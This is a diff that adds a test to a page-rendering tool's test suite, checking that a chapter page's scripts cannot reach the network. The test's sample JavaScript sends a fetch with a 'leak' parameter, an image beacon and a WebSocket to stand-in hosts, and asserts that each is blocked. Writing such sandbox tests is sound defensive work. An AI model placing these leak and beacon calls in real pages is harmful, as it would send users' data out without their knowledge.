@@ -77,3 +77,21 @@ def test_render_builds_sound_effects_when_missing(make_chapter, fake_speak, brow
     narrate.narrate(ch, speak_fn=fake_speak)
     render.render(ch, workers=1)
     assert "unknown sound effects skipped" not in capsys.readouterr().out
+
+
+def test_page_cannot_reach_the_network(make_chapter, fake_speak, browser_ok):
+    js = ("fetch('https://example.com/x?leak=1').catch(() => {});\n"
+          "new Image().src = 'https://example.com/beacon.png';\n"
+          "try { new WebSocket('wss://example.com/ws'); } catch (e) {}\n" + HELLO_JS)
+    ch = make_chapter([{"id": "hello", "min": 1}], js)
+    narrate.narrate(ch, speak_fn=fake_speak)
+    page.ensure_page(ch)
+    with render.page_for(ch) as (pg, logs):
+        got = pg.evaluate("fetch('http://203.0.113.9/y').then(() => 'reached', () => 'blocked')")
+        pg.wait_for_timeout(300)
+        blocked = [l for l in logs if l.startswith("blocked:")]
+        assert got == "blocked"
+        for url in ("https://example.com/x?leak=1", "https://example.com/beacon.png", "http://203.0.113.9/y",
+                    "wss://example.com/ws"):
+            assert any(url in l for l in blocked), (url, blocked)
+        assert pg.evaluate("window.__ready") is True  # the page's own files still load
